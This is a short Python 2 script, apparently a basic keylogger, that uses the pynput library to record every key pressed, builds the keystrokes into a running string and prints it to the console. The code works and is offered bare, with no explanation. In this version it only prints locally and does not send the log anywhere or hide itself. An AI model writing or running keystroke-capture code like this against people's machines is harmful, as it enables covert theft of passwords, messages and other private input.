#!/usr/bin/python

import pynput.keyboard

log = ""

def process_key_press(key):
	global log
	try:
		log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + " "
		else:	
			log = log +" " + str(key) + " "

	print log

keyboard_listener=pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
	keyboard_listener.join()
